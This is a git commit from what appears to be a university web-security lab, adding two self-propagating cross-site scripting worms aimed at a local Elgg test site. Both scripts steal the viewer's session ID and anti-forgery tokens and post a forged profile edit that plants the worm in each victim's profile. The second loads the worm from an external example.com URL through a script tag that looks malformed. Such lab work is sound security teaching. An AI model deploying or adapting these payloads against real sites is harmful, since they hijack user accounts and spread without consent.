8009e15150d19a0d964cc6da09ce8b17d1cf5a19
TAY TS <taytzushieh@gmail.com>
2020-03-26 18:39:17 +0800

    Add lab6 task6

---
+++ lab6/task6_self_propagating_DOM.js
@@ -0,0 +1,34 @@
+<script type="text/javascript" id="worm">
+window.onload = function() {
+    var headerTag = '<script id="worm" type="text/javascript">';
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+
+    // Put all the pieces together, and apply the URI encoding
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+    // Edit profile code
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var name = "&name=" + elgg.session.user.name;
+    var desc = "&description=" + wormCode + "&accesslevel[description]=2";
+
+    // Construct the content of your url.
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+    var content = guid + name + desc + ts + token;
+    var samyGuid = 47;
+
+    if (elgg.session.user.guid != samyGuid) {
+        //Create and send Ajax request to modify profile
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader(
+            "Content-Type",
+            "application/x-www-form-urlencoded"
+        );
+        Ajax.send(content);
+    }
+};
+</script>
---
+++ lab6/task6_self_propagating_link.js
@@ -0,0 +1,32 @@
+<script type="text/javascript">
+window.onload = function() {
+    // External malicious script
+    var wormCode = encodeURIComponent(
+        `<script type="text/javascript" src="http://example.com/xss_worm.js"</script>`
+    );
+
+    // Edit profile code
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var name = "&name=" + elgg.session.user.name;
+    var desc = "&description=" + wormCode + "&accesslevel[description]=2";
+
+    // Construct the content of your url.
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+    var content = guid + name + desc + ts + token;
+    var samyGuid = 47;
+
+    if (elgg.session.user.guid != samyGuid) {
+        //Create and send Ajax request to modify profile
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader(
+            "Content-Type",
+            "application/x-www-form-urlencoded"
+        );
+        Ajax.send(content);
+    }
+};
+</script>
